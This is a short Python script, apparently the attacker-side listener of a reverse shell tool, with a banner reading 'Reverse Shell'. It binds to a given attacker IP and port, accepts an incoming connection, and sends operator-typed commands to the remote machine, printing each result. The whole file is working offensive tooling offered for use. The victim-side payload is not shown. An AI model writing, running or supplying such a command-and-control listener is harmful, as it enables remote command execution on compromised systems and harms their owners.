# Importing modules required
from socket import socket
import sys, getopt
import pyfiglet
import os

os.system("clear")
# Creating and printing out banner
ascii_banner = pyfiglet.figlet_format("! ! Reverse Shell ! !")
print(ascii_banner)

# Create a connection socket
def connect(ipAddr, Port):
    s = socket()
    s.bind((ipAddr, Port))
    s.listen(1)
    print("[*] Waiting for connection !")
    conn, addr = s.accept()
    print(f"[+] Connected to {addr}")

    while True:
        command = input("Shell=> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            print("[!] Connection Terminated !")
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
def main():
    ipAddr = None
    Port = None
    argv = sys.argv[1:]
    try:
        opts, args = getopt.getopt(argv, "i:p:h:")
    except:
        print("[!] Format not valid. reverse-shell.py -i <IP Address of Attacker> -p <Port Number>")  
    for opt, arg in opts:
        if opt in ['-h']:
            print(f"[*] Format used = ./reverse-shell.py -i <IP Address of Attacker> -p <Port Number> ")
            break
        elif opt in ['-i']:
            ipAddr = arg
        elif opt in ['-p']:
            Port = int(arg)
    print(f"IP address = {ipAddr} & Port number = {Port}")
    try:
        connect(ipAddr, Port)
    except:
        print(f"[!] Please Specify the Argument. IP address & Port to activate the shell")
        print("[!] Format not valid. reverse-shell.py -i <IP Address of Attacker> -p <Port Number>")
main()
